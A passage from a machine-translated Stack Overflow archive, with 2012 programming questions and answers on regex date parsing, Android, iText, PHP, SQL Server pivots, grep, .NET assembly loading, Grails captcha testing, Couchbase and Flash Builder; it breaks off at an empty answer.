"Wed 23 Jan - 20h"
("Wed 23 Jan 20h")
"Sat 26 Jan - 11h + 14h / Sun 27 Jan - 11h"
("Sat 26 Jan 11h", "Sat 26 Jan 14h", "Sun 27 Jan 11h")
"Fri 8 and Sat 9 Feb - 20h30 + thu 1 feb - 15h"
("Fri 8 Feb 20h30", "Sat 9 Feb 20h30", "Thu 1 feb 15h")
"Sat 2 Mar - 11h + 14h / Sun 3 Mar - 11h"
("Sat 2 Mar 11h", "Sat 2 Mar 14h", "Sun 3 Mar 11h")
"Wed 12, Thu 13, Fri 14 and Sat 15 Jun - 19h + Sun 16 Jun - 12h30"
("Wed 12 Jun 19h", "Thu 13 Jun 19h", "Fri 14 Jun 19h", "Sat 15 Jun 19h", "Sun 16 Jun 12h30") 
```

通过这两个正则表达式，我可以找到第一个字符串的 3 个日期：

```
(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s([0-9]{1,2}\s(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec))(?:.*?)([0-9]{1,2}[uh\:](?:[0-9]{2})?)

(Mon|Tue|Wed|Thu|Fri|Sat|Sun)\s([0-9]{1,2}\s(?:Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec))(?:.*?\+\s)([0-9]{1,2}[uh\:](?:[0-9]{2})?) 
```

**是否可以使用一个或两个正则表达式模式从这些字符串中获取所有日期（以匹配所有日期）。**所以我认为它需要做什么：如果没有给出每个日期的第一个下个月，则获取相应的时间，如果后面有多个小时，则每个日期都有多个日期时间。格式化不是那么重要。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-16T17:46:52.740

我让你开始了。这是我对你的问题的解释。我把执行留给`parse_complex`你。

```
class DateParser(object):
    """parse dates according to the custom rules here:

    >>> DateParser("Sat 1 Dec - 11h + 14h / Sun 2 Dec - 12h30").parse()
    ("Sat 1 Dec 11h", "Sat 1 Dec 14h", "Sun 2 Dec 12h30")
    >>> DateParser("Tue 27 + Wed 28 Nov - 20h30").parse()
    ("Tue 27 Nov 20h30", "Wed 28 Nov 20h30")
    >>> DateParser("Fri 4 + Sat 5 Jan - 20h30").parse()
    ("Fri 4 Jan 20h30", "Sat 5 Jan 20h30")
    >>> DateParser("Wed 23 Jan - 20h").parse()
    ("Wed 23 Jan 20h")
    >>> DateParser("Sat 26 Jan - 11h + 14h / Sun 27 Jan - 11h").parse()
    ("Sat 26 Jan 11h", "Sat 26 Jan 14h", "Sun 27 Jan 11h")
    >>> DateParser("Fri 8 and Sat 9 Feb - 20h30 + thu 1 feb - 15h").parse()
    ("Fri 8 Feb 20h30", "Sat 9 Feb 20h30", "Thu 1 feb 15h")
    >>> DateParse("Sat 2 Mar - 11h + 14h / Sun 3 Mar - 11h").parse()
    ("Sat 2 Mar 11h", "Sat 2 Mar 14h", "Sun 3 Mar 11h")
    >>> DateParser("Wed 12, Thu 13, Fri 14 and Sat 15 Jun - 19h + Sun 16 Jun - 12h30").parse()
    ("Wed 12 Jun 19h", "Thu 13 Jun 19h", "Fri 14 Jun 19h", "Sat 15 Jun 19h", "Sun 16 Jun 12h30")
    """

    def __init__(self, line):
        self.date  = line
        self.dates = self.split_dates(line)
        self.final = []

        self.days = ['mon', 'tue', 'wed', 'thu', 'fri', 'sat', 'sun']
        self.mons = ['jan', 'feb', 'mar', 'apr', 'may', 'jun', 'jul', 'aug', 'sep', 'oct', 'nov', 'dec']

    def parse(self):
        if self.is_complex():
            self.parse_complex()
        else:
            self.parse_simple()

        return tuple(self.final)

    def parse_simple(self):
        """typical formats: 
        Day 00 + Day 01 Mon - 00h00
        Day 00 Mon - 00h00 + 01h00
        Day 00 Mon - 00h00 / Day 02 Mon - 00h00
        """

        for date in self.dates:
            mods = self.split_modifiers(date)

            date_mods = []
            for mod in mods:
                if self.is_complete(mod):
                    #only *one* base_date
                    base_date, time = self.split_time(mod)
                    date_mods.append(time)
                else:
                    date_mods.append(mod)

            for mod in date_mods:
                if self.is_hour(mod):
                    #Sat 1 Dec - 11h + 14h
                    self.final.append(' '.join([base_date, mod]))
                else:
                    #Fri 4 + Sat 5 Jan - 20h30
                    self.final.append(' '.join([mod, self.extract_month(base_date), time]))

    def parse_complex(self):
        """typical format:
        Day 00, Day 01 and Day 02 Mon - 00h00 + Day 03 Mon 01h00
        """
        raise NotImplementedError()

    def is_complex(self):
        """presence of the complex date attribute requires special parsing"""
        return self.date.find(' and ') > -1

    def is_complete(self, section):
        """section has format `Day 00 Mon - 00h00`
        must have no modifiers to determine completeness
        """
        sections = map(lambda x: x.lower(), section.split())

        try:
            dow, dom, moy, dash, time = sections
        except ValueError, e:
            return False

        return all([dow in self.days, moy in self.mons])

    def is_hour(self, section):
        return section[0].isdigit()

    def is_day(self, section):
        return section[:3].lower() in self.days

    def extract_month(self, section):
        """return the month present in the string, if any"""
        for mon in self.mons:
            if section.lower().find(mon) > -1:
                found = section.lower().index(mon)
                return section[found : found + 3]
        return None

    def split_dates(self, section):
        """split individual dates from a list of dates"""
        return section.split(' / ')

    def split_time(self, section):
        """split individual times from a complete date"""
        return section.split(' - ')

    def split_modifiers(self, section):
        """extend a date by implying that they share a date or a time
        modifiers change their meaning when parsing a complex date
        """
        return section.split(' + ')

>>> DateParser("Fri 4 + Sat 5 Jan - 20h30 / Sat 1 Dec - 11h + 14h + 16h / Sun 2 Dec - 12h30").parse()
('Fri 4 Jan 20h30', 'Sat 5 Jan 20h30', 'Sat 1 Dec 11h', 'Sat 1 Dec 14h', 'Sat 1 Dec 16h', 'Sun 2 Dec 12h30') 
```

如果您对我记录本课程的方式有任何疑问，请随时回复我，我可以为您提供更多帮助。这个问题比我最初想象的要复杂一些，我需要先完成一些其他的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:24:59.677

我没有足够的声誉来评论您的问题，但您不能只使用分组。并在 day-number-month 部分周围添加括号并找到组号并将其与小时分组部分放在一起？然后我认为你只需要 1 个正则表达式，但需要处理一些组。这是一个链接[http://flockhart.virtualave.net/RBIF0100/regexp.html](http://flockhart.virtualave.net/RBIF0100/regexp.html)这里有一个将第二个分组的小例子，非常简单，你可能已经知道这些东西了。

亲切的问候

# volume - Google-TV 无法控制音量

> ID：13418085
> 
> 赞同：0
> 
> 时间：2012-11-16T13:59:10.320
> 
> 标签：volume, google-tv, android-audiomanager

我有一个 google-tv 应用程序应该播放某种媒体 (hls)
我正在尝试控制音量但认为它不起作用我在 oncreate 中使用以下代码：
setVolumeControlStream(AudioManager.STREAM_MUSIC);

然后在尝试修改音量时： audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, volumedown, AudioManager.FLAG_SHOW_UI);
其中 volumedown 是所需的新音量。音量控制出现在屏幕上并前后移动，但音量不起作用。
谁能告诉我这有什么问题，我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-20T09:58:05.780

试试这个，对我有用

```
@Override
public void VolumeUp()
{
    AudioManager audioManager = (AudioManager) getSystemService(getApplicationContext().AUDIO_SERVICE);
    int actualVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, actualVolume + 1, AudioManager.FLAG_SHOW_UI);
}

// Decrease volume
@Override
public void VolumeDown()
{
    AudioManager audioManager = (AudioManager) getSystemService(getApplicationContext().AUDIO_SERVICE);
    int actualVolume = audioManager.getStreamVolume(AudioManager.STREAM_MUSIC);
    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, actualVolume - 1, AudioManager.FLAG_SHOW_UI);
} 
```

# java - 使用 iText 在两条不同的行上对齐文本

> ID：13418087
> 
> 赞同：0
> 
> 时间：2012-11-16T13:59:12.990
> 
> 标签：java, pdf, itext

我正在使用 iText 创建 PDF 并希望在两个段落中垂直对齐文本。我正在使用制表符来尝试对齐“1”和“2”：

```
document.add(new Paragraph("Example"+"\t\t\t1"));
document.add(new Phrase("Hello World JAVA"+"\t\t\t2")); 
```

这是生成的 PDF 外观的屏幕截图：

![PDF 示例](../Images/f8da263bb47237cf5751dc4f525cfaa2.png)

谁能建议一种更好的对齐文本的方法？显然标签没有按我的预期工作。我正在寻找的是这个：

```
Example           1
Hello World JAVA  2 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T09:35:10.377

我刚刚发现了如何对评论进行投票，并且对 mkl 的评论进行了投票，因为答案确实可以在我是作者的[http://www.manning.com/lowagie2/samplechapter2.pdf中找到。](http://www.manning.com/lowagie2/samplechapter2.pdf)

在 PDF 中搜索**TAB CHUNKS**。请注意，该`'\t'`字符在 PDF 中没有任何意义。

# php - 保存数据的功能在php中不起作用

> ID：13418090
> 
> 赞同：0
> 
> 时间：2012-11-16T13:59:34.210
> 
> 标签：php, function, save

我试图将代码 php 和代码 html 分开在 2 个文件中。

所以我正在做许多将在我的页面的不同部分执行的功能。

目前我正在尝试制作一个保存小表单数据的功能。

所以我写了这段代码：

```
function addAnnonce($session) {
    $sql = "SELECT `nom`,`prenom`,`type` FROM `gestionnaire` WHERE `id`={$session}";
    $result = mysql_query($sql);
    $donnees = mysql_fetch_assoc($result);
}

function saveAnnonce($form, $annonce, $to) {
    if (isset($form)) {
        addAnonce($_SESSION['login']);
        $by = $donnees['nom'] . '&nbsp;' . $donnees['prenom'];
        $sql = "INSERT INTO `cometchat_announcements` SET
    `announcement`  ='" . mysql_real_escape_string($annonce) . "',
    `by`            ='" . mysql_real_escape_string($by) . "',
    `time`          ='" . mysql_real_escape_string(time()) . "',
    `to`            ='" . mysql_real_escape_string($to) . "'";
        mysql_query($sql);
        echo "<div class=\"success\">L'annoncea bien &eacute;t&eacute; ajout&eacute;e , vous pouvez continuer vos actions<br>La mise &agrave; jour interviendra apr&egrave;s actualisation</div>";
        echo "<SCRIPT type=\"text/javascript\"> 
<!-- 
alert(\"Ajout d\'une nouvelle annonce : Ok !\");
// --> 
</SCRIPT> ";
    }
}
    isset($_POST['enreg']) ? saveAnnonce($_POST['enreg'], $_POST['annonce'],$_POST['to']) :'' ; 
```

问题是它向我显示一个空白页。

我真的不明白为什么。

它应该显示表单，但我认为有问题但我看不到什么。

我已经用 xdebug 尝试过了，但它并没有向我显示任何内容。

任何形式的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:02:36.563

您没有返回`$donnees`到工作流，因此未定义`$donnees`in 。`saveAnnonce()`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-16T14:08:03.783

`addAnnonce`您在调用它时也会拼写错误( `addAnonce`)。

请注意，您不需要`if(isset($form))`，它将始终设置，因为它是函数的必需参数。

# c# - 如何通过 WUAPI 从 DownloadContents 获取 DownloadUrl

> ID：13418091
> 
> 赞同：2
> 
> 时间：2012-11-16T13:59:42.510
> 
> 标签：c#, windows-update

我想获取 windows 更新补丁的下载 url，我的代码是

```
 var session = new UpdateSession();
        var searcher = session.CreateUpdateSearcher();
        var searchType = "Type='Software' and IsInstalled =0";

        searcher.Online = false;
        var searchResult = searcher.Search(searchType);
        var collection = searchResult.Updates;

        foreach (IUpdate item in collection)
        {
            outpu("Title: \t{0}", item.Title);
            outpu("UpdateId: \t{0}", item.Identity.UpdateID);
            outpu("Description: \t{0}", item.Description);
            if (item.KBArticleIDs[0] == "2592687")
            {
                Trace.WriteLine("what");
            }
            if ((item.BundledUpdates.Count > 0) && (item.BundledUpdates[0].DownloadContents.Count >0))
                outpu("DownloadUrl: \t{0}", item.BundledUpdates[0].DownloadContents[0].DownloadUrl);
        } 
```

通常我可以得到下载网址，但有时我不能。例如，当

```
KBArticleIDs = "2592687" 
```

调试显示“DownloadContents”没有孩子，我该怎么办？

# android - Android 相机 PreviewFormat 的 MIME 类型

> ID：13418093
> 
> 赞同：4
> 
> 时间：2012-11-16T13:59:59.703
> 
> 标签：android, video, android-camera, mime

我想使用[MediaCodec](http://developer.android.com/reference/android/media/MediaCodec.html)对来自相机的数据进行编码（原因：它的级别更低，因此希望比使用[MediaRecorder](http://developer.android.com/reference/android/media/MediaRecorder.html)更快）。使用[Camera.PreviewCallBack](http://developer.android.com/reference/android/hardware/Camera.PreviewCallback.html)，我将来自相机的数据捕获到字节缓冲区中，以便将其传递给 MediaCodec 对象。

为此，我需要填写一个[MediaFormat](http://developer.android.com/reference/android/media/MediaFormat.html)对象，如果我知道来自相机的数据的 MIME 代码，这将相当容易。我可以使用[setPreviewFormat()](http://developer.android.com/reference/android/hardware/Camera.Parameters.html#setPreviewFormat%28int%29)选择在 te [ImageFormat](http://developer.android.com/reference/android/graphics/ImageFormat.html) -class 中声明的常量之一来选择这种格式。

因此我的问题是：鉴于 ImageFormat 类提供了不同的选项来设置相机预览格式，相应的 MIME 类型代码是什么？

提前非常感谢。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T16:30:05.970

[请参阅https://gist.github.com/3990442](https://gist.github.com/3990442)中的示例。您应该设置要从编码器中获取的 MIME 类型，即**"video/avc"**。

# java - netbeans 调试最佳实践

> ID：13418095
> 
> 赞同：1
> 
> 时间：2012-11-16T14:00:02.057
> 
> 标签：java, debugging, netbeans

[编辑：让我改述一下]假设`o`在调试中出现的对象具有属性`a`和`b`，具有值`null`和`Hello`。是否可以为下一个调试会话自动生成以下代码：

```
if(o.a == null && o.b == "Hello") {
} 
```

在调试一个必须处理复杂用户输入的程序时，例如编程语言的解析器，我经常想从解析过程中的某个点开始调试。当处理来自特定输入代码行的指令时，我实现了一种简单的启动方式。
但是，行可能包含非常复杂的指令，导致代码中的深度递归，因此在开始调试后，我必须手动深入程序。当这种情况发生在函数`func(obj a)`中时，我通常会写一些像这样的丑陋代码：

```
public void func(obj a) {
  if(a instanceof someClass && ((someClass)a).hasSomeProperty() && ((someClass)a).getIdentifier().equals("myID")) {
  // set a breakpoint here
  }
  // other code 
} 
```

所以基本上我尝试通过识别传递给函数的对象来识别有趣的情况。我知道这些值，因为我通常在其他代码中引发的异常上设置断点。所以我的问题是：不是编写所有这些丑陋的代码来生成正确的断点，有没有办法根据变量在以前的调试会话中的某个值来配置条件断点？基本上说：当对象与此处的对象完全一样时，请在此处停止？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-10-09T14:20:22.487

您可以执行以下操作：编写一个静态实用程序方法（“writer”），序列化并写入您想要与未来调试会话进行比较的对象；另一个方法（“reader”）接收一个 Object 并将其与序列化版本进行比较，当两者相等时返回 true。
之后，您可以定义一个或多个条件断点，它们会调用“writer”方法并且不会停止。
此外，您将定义另一个调用“reader”方法的条件断点，该方法照常停止线程，但仅在满足条件时才停止。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:06:09.920

Netbeans 提供条件断点功能：在一行上设置断点后，右键单击它，选择 Breakpoint-Properties，选中 Condition 复选框并插入 Java 代码来表达一个必须为真才能中断程序执行的条件。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-16T14:07:16.143

添加断点，右键单击它，在断点属性窗口中转到断点 -> 属性，您将看到一个条件框，然后添加您的 if

# javascript - 如何使用 javascript 显示和更新总价？

> ID：13418100
> 
> 赞同：0
> 
> 时间：2012-11-16T14:00:25.240
> 
> 标签：javascript, jquery

所以我想添加一个产品，同时更新购物车中的总价。

```
$(".articel input[type='button']").click(function() {                   
    var price = $(this).siblings("input[name='price']").attr("value");
    var quantity = $(this).siblings("input[type='number']").attr("value");

    if (quantity % 1 != 0) {
        alert("You must add a whole number");
    }
    else if (quantity <= 0) {
        alert("You can not add a negative number or nothing");
    }
    else {
        var name = $(this).siblings("input[name='prodname']").attr("value");
        var ul = document.getElementById("buylist"); 
        var totalprice = quantity * price;
        var prod = name + " x " + quantity + "= " + totalprice + "$";
        var el = document.createElement("li"); 
        el.innerHTML = prod; 
        ul.appendChild(el); 
    }
});
}); 
```

这是 products 和 totalprice 添加的地方：

```
<h4>Shopping Cart</h4>
<div id="buylist">
    <ul>
    </ul>
    <div id="totalprice">
        <h4>Total price:<h4>
    </div>
</div>

<a href="#checkout" onClick="checkOut()" class="click" data-toggle="tab" id="form">Checkout</a>
</div> 
```

这是我将产品添加到购物车的一种形式

```
<form class="articel">
    Quantity: <input type="number" style="width:30px;"><br>
    Add to cart: <input type="button" class="btn">
    <input type="hidden" value="30" name="price">
    <input type="hidden" value="The walking dead" name="prodname">
</form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-16T14:33:31.633

也许我真的不明白。但是当产品或数量发生变化时，您必须计算价格。我建议，你已经为这两个动作准备了一个事件。然后我会运行一个计算价格的函数。

现在取决于您是否已经有了固定价格，或者还必须将其与数量相乘。循环浏览产品并计算价格。

注意：要选择价格和数量，我使用了您的代码中实际上没有的选择器。

```
function calculatePrice() {
    var quantity, price, sum = 0;
    //loop through product "blocks"
    $('.articel').each(function() {
        price = $(this).children('.price').val();
        quantity = $(this).children('.quantity').val();
        //Add price to sum if number
        if (!isNaN(price) && !isNaN(quantity)) {
            sum += price * quantity;
        }
    });
    //Update Price
    $('#totalprice').html('<h4>Total price:' + sum + '</h4');
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T14:17:09.997

如果您将价格和数量添加到 UL 中，您可以轻松处理：

```
<ul>
  <li data-quantity="X" data-price="Z">...</li>
</ul> 
```

将此函数添加到 javascript 文件中。

```
function calcTotal (ul) {
  var newTotal = 0;
  ul.find('li').each( function(i,e) {
    var li = $(e);
    newTotal += li.data('quantity') * li.data('price');
  });
} 
```

然后在您的代码中，还有最后一个 else：

```
itemPrice = quantity * price;
var prodDesc = name + " x " + quantity + "= " + itemPrice + "$";//same as it was.
var newLi = $("<li>");
newLi.text(prodDesc).data('quantity', quantity).data('price', price);
ul.append(newLi);
var totalPrice = calcTotal(ul);
$('#totalprice h4').text('Total Price: ' + totalPrice); 
```

或多或少就是这样。

# sql - 数据透视表 SQL 中的水平总计

> ID：13418103
> 
> 赞同：3
> 
> 时间：2012-11-16T14:00:37.560
> 
> 标签：sql, sql-server, sql-server-2008, tsql

我有这个查询工作：

```
 select cap_idPlanoContasFin  , [3684],[2234],[2] ,  
      from 
      (
      select cap_idPlanoContasFin,cap_idempresa,sum(cap_valorfatura) 
          as Stotal    
          from erp_ContasPagar 
       group by cap_idPlanoContasFin , cap_idEmpresa 

       ) as sourcetable
       pivot 
       (sum(Stotal)for cap_idEmpresa in ([3684],[2234],[2])
       )as pivottable; 
```

此查询返回：

```
 cap_idPlanoContasFin  3684          2234       2
                      3 9000          NULL      NULL
                     10 1057840,68    NULL  1865081,35
                     11 NULL          7283,1    591,9
                     12 NULL          NULL  178914,45
                     13 9305,07       1117,6    500
                     14 NULL          59333,5   34611,74 
```

我想在同一个查询中输入水平总计示例：

```
 cap_idPlanoContasFin  3684      2234            2           Total
      ---------------------------------------------------------------------      
                       13   9305,07    1117,6   500          10922,67 
```

这个怎么做？我读过一些东西`UNION`。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-16T15:54:05.240

首先，您不需要事先对数据进行分组：PIVOT 子句将为您完成。因此，您可以删除 GROUP BY 子句并相应地更改`SUM()`PIVOT 中的 ' 参数：

```
select cap_idPlanoContasFin, [3684], [2234], [2]  
from 
(
  select cap_idPlanoContasFin, cap_idempresa, **cap_valorfatura**
    from erp_ContasPagar 
  ~~group by cap_idPlanoContasFin , cap_idEmpresa~~
) as sourcetable
pivot 
(
  sum(**cap_valorfatura**) for cap_idEmpresa in ([3684], [2234], [2])
) as pivottable; 
```

要添加总计列，您可以使用如下[窗口](http://msdn.microsoft.com/en-us/library/ms189461.aspx "OVER 子句 (Transact-SQL)") `SUM()`：

```
select cap_idPlanoContasFin, [3684], [2234], [2]**, Total**
from 
(
  select cap_idPlanoContasFin, cap_idempresa, cap_valorfatura**,
         sum(cap_valorfatura) over (partition by cap_idPlanoContasFin) as Total**
    from erp_ContasPagar 
) as sourcetable
pivot 
(
  sum(cap_valorfatura) for cap_idEmpresa in ([3684], [2234], [2])
) as pivottable; 
```

但是请注意，如果您`sourcetable`包含的行的`cap_idEmpresa`值不是 PIVOT 子句中列出的值，则相应的`cap_valorfatura`值也将相加。因此，您可能希望`sourcetable`在旋转之前过滤行集，如下所示：

```
select cap_idPlanoContasFin, [3684], [2234], [2]**, Total**
from 
(
  select cap_idPlanoContasFin, cap_idempresa, cap_valorfatura,
         sum(cap_valorfatura) over (partition by cap_idPlanoContasFin) as Total
    from erp_ContasPagar 
   **where cap_idempresa in (3684, 2234, 2)**
) as sourcetable
pivot 
(
  sum(cap_valorfatura) for cap_idEmpresa in ([3684], [2234], [2])
) as pivottable; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-19T13:16:00.503

感谢大家，这是最后的查询：

```
 select cap_idPlanoContasFin, plc_classificador, plc_nomeConta,[3684], [2234], [2], 
 isnull ([2234],0) + isnull ([2],0) AS Subtotal ,Total    
 from 
 (
 select A.cap_idempresa, A.cap_idPlanoContasFin,  A.cap_valorfatura, 
 B.plc_classificador , B.plc_nomeConta,
 sum(A.cap_valorfatura) over (partition by A.cap_idPlanoContasFin) as Total
 from erp_ContasPagar A /*where cap_idempresa in (3684, 2234, 2)*/ 
 inner  join  tbl_PlanoFinanceiro B on A.cap_idPlanoContasFin = B.plc_id
 )  as sourcetable
 pivot 
 (
 sum(cap_valorfatura) for cap_idEmpresa in ([3684], [2234], [2])
 ) as pivottable; 
```

我需要使用 isnull 将 NULL 更改为 o 以 sume subtotal 。再次感谢帮助

# regex - 正则表达式，仅包含 1 个字符的 grep 行

> ID：13418104
> 
> 赞同：3
> 
> 时间：2012-11-16T14:00:40.713
> 
> 标签：regex, grep, bigdata

我正在寻找一个有效的正则表达式[（最好是所有格）](http://www.regular-expressions.info/possessive.html)，我可以用它来从一个大文件（5Gb）中 grep 只包含一个分隔符（'，'）的行：

例如

```
X,Y
X1,Y1,Y2
X3,Y3
X4,Y4
X5,Y5,Z6 
```

>>> grep“？？？” 大文件

```
X,Y
X3,Y3
X4,Y4 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-16T14:09:43.777

`^[^,]*,[^,]*$`由于字符串的开始/结束标记，不应该简单地避免回溯吗？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-16T15:30:49.030

尽管@Rawling（这里的答案之一）是正确的并且他的正则表达式是正确的，但它仍然不是所有格，因此没有优化，他是正确的，不会发生回溯，但它不会具有最佳性能*，因为所有格量词不必记住任何回溯位置。*正如问题所附链接中所述。

以下表达式将是所有格和优化的，我将与问题中提出的 grep 一起演示：

> grep -E "^[^,]*+,[^,]*+$" big_data

# .net - 程序集中的类数量如何影响性能？

> ID：13418108
> 
> 赞同：2
> 
> 时间：2012-11-16T14:00:43.750
> 
> 标签：.net, performance, assemblies, .net-assembly

我正在从事的项目将为大量类生成代码——预计会有数百到数千个。在生成时不知道这些类中有多少会被实际访问。

生成的类可以 (1) 全部存在于单个程序集（或可能是少数程序集）中，当脚趾消耗过程开始时将加载该程序集。

*...或者 (2) 我可以为每个*类生成一个程序集，就像 Java 将每个类编译为一个`*.class`二进制文件一样，然后提出一种机制来按需加载程序集。

问题：哪种情况会产生更好的（内存和时间）性能？

我的直觉是，对于案例 (1)，加载时间和使用的内存与构成单个整体程序集的类的数量成正比。OTOH，案例 (2) 有其并发症。

如果您知道有关加载程序集内部的任何资源，尤其是调用了哪些代码（如果有的话！？）以及分配了哪些内存（新加载程序集的簿记），请分享它们。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-16T16:10:01.370

您正在尝试解决一个不存在的问题，程序集加载在 .NET 中得到了极大的优化 **。**

毫无疑问，将一个大型组件分解为许多较小的组件是您能做的最糟糕的事情。到目前为止，加载程序集的最大开销是查找文件。这是一个*冷启动*问题，CLR 加载程序被慢速磁盘所困，需要检索和搜索目录条目以定位包含文件内容的磁盘扇区。当可以从文件系统缓存中检索程序集数据时，此问题会在*热启动*时消失。请注意，Java 也不是这样做的，它会将 .class 文件打包到 .jar 中。.jar 大致相当于一个程序集。

找到文件后，.NET 使用操作系统工具使实际加载程序集数据变得非常便宜。它使用内存映射文件。这仅涉及为文件保留虚拟内存，而*不是*从文件中读取。

读取直到稍后才会发生，并且是由*page fault*完成的。任何按需分页虚拟内存操作系统的功能。访问虚拟内存会产生页面错误，操作系统从文件中加载数据并将虚拟内存页面映射到 RAM。之后程序继续，永远不会意识到它被操作系统打断了。产生这些页面错误的将是抖动，它访问程序集中的元数据表以定位方法的 IL。然后它从中生成可执行的机器代码。

此方案的一个自动好处是您永远不会为程序集中但未使用的代码付费。抖动根本没有理由查看包含 IL 的文件部分，因此它实际上从未被读取。

并注意这种方案的缺点，第一次使用一个类确实会因为磁盘读取而导致性能命中。这需要以一种或另一种方式支付，在 .NET 中，债务应在最后一刻到期。这就是为什么属性以缓慢着称的原因。

较大的组件总是比许多较小的组件好。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-16T14:06:56.503

> 哪种情况会产生更好的（内存和时间）性能

考虑到编译器会为你做很多优化，选项 1 绝对是要走的路。*每个类*都有一个单独的程序集似乎完全是矫枉过正。不仅如此，您可能会发现加载 1 个大型程序集比加载许多小型程序集更快。

此外，这确实感觉像是过早的优化，我的建议是坚持第一个（理智的）选项，如果您认为需要，稍后将类拆分为单独的程序集。

# grails - Grails JCaptcha 测试模式

> ID：13418109
> 
> 赞同：0
> 
> 时间：2012-11-16T14:00:45.550
> 
> 标签：grails, captcha, grails-plugin

任何使用 JCaptcha grails 插件的人都知道它是否具有测试模式（用于自动测试，GEB/Selenium），或者我是否必须手动将测试参数添加到我的配置文件并在所有检查验证码的控制器中检查它?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-23T11:30:50.330

没有找到测试模式，但通过在 grails 配置文件中定义测试模式变量来解决它。

```
 def captchaOK = false
    try {
        captchaOK = jcaptchaService.validateResponse("captchaImage", session.id, params.captchaText)
        }
    }
    catch(CaptchaServiceException cse) {
        captchaOK = false;
    } 
```

被替换为：

```
 def captchaOK = false
    try {
        if(grailsApplication.config.capatchaTestMode == true) {
            captchaOK = true;
        }
        else {
            captchaOK = jcaptchaService.validateResponse("captchaImage", session.id, params.captchaText)
        }
    }
    catch(CaptchaServiceException cse) {
        captchaOK = false;
    } 
```

# php - 使用 PHP API 在 couchbase 2.0 服务器中借助 cas 更新文档

> ID：13418114
> 
> 赞同：0
> 
> 时间：2012-11-16T14:01:21.617
> 
> 标签：php, couchbase

我正在尝试使用 PHP API (php-ext-couchbase) 更新 Couchbase 2.0 服务器中的文档。 [http://www.couchbase.com/docs/couchbase-sdk-php-1.1/api-reference-summary.html](http://www.couchbase.com/docs/couchbase-sdk-php-1.1/api-reference-summary.html)

该文档类似于带有评论和点赞的 facebook POSTS。

更加具体。

- 加载文档。

-修改它

- 如果没有其他人访问过，则存储修改后的文档。

完成此操作所需的基本操作将是

```
# Get a document by key
doc = get(key)
# Modify a document when no one has modified it since my last read
casVersion = doc.getCas()
cas(key, casVersion, changedDoc) 
```

我只想知道如何在 PHP 中实现这一点。特别是如何获取文档的casVersion或revision_id，然后进一步进行更新过程，以使同一文档同时更新所做的更改不丢失。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-17T14:07:20.457

不用担心找到了

代码是

```
 $bucket='yourbucketname';
    $cb=new Couchbase("127.0.0.1:8091","root","password",$bucket);

    $old_doc=null;

    $cb->getDelayed($obj_id, true,
    function($cb, $data) use (&$old_doc) { $old_doc = $data; });

    $casKey=$old_doc['cas']; 
```

使用 getDelayed 方法和回调函数获取具有 (key,value,caskey) 的数组

我希望将来沙发库文档中的用法示例会更加清晰。

# flash - Flash builder新手-当我运行一个flex项目时，浏览器显示一个空白屏幕

> ID：13418115
> 
> 赞同：2
> 
> 时间：2012-11-16T14:01:22.257
> 
> 标签：flash, apache-flex, flash-builder, flex4.5, flash-builder4.5

我正在学习 Flex v4.6-> Flash Builder。

现在，我创建了一个简单的 flex 项目，它的 UI 中只有一个标签。我保存了项目并尝试运行它——在浏览器中打开一个新页面，但是该页面显示为空白——标签未显示。

我的操作系统是 Windows 8 Pro 和浏览器 = Google Chrome。

为什么 Chrome 会显示空白屏幕？我该如何解决这个问题？我只是按照关于 Flex 的书中的说明进行操作，并按照说明添加了单个标签。书名是 Adob​​e Flex 4.5 Fundamentals: Training from the Source。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-16T16:35:12.113

不幸的是，这是 Chrome 中 Flash 调试的一个已知间歇性问题。生成的 HTML 页面往往无法正常工作。对于大多数调试目的，我会尝试不同的浏览器（我相信 IE9，大概 10，Firefox 过去曾为我工作过）或使用实际的调试播放器而不是浏览器进行调试。

要切换调试播放器，请在 FlashBuilder 中执行此操作

1.  运行 > 调试配置...
2.  这应该默认为当前项目。如果没有，请使用侧边栏转到该项目
3.  在设置区域中，您应该会看到一个标题为“URL 或启动路径”的部分。取消选中“使用默认值”
4.  浏览并选择您的 SWF，而不是您的 HTML 页面

这将在 Flash Player 中打开它并从等式中消除 Chrome

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-02-09T20:47:36.727

我注意到的另一件事是，如果它们打开了其他选项卡，则它是空白的。关闭一个选项卡，Flash 神奇地出现了。

# scripting - 如何使用 DXL 在 DOORS 中查找基线链接

> ID：13418118
> 
> 赞同：1
> 
> 时间：2012-11-16T14:01:38.137
> 
> 标签：scripting, ibm-doors

对于给定的对象，我如何找到基线模块的链接？下面的代码似乎只适用于“当前”工作版本的模块的链接。

```
Link lnk
for lnk in (current Object) -> "*" do 
{
    print "Link found"
} 
```

谢谢，菲尔

编辑：为代码块添加标记 -Jaambageek

* * *

## 回答 #1

> 赞同：3
> 
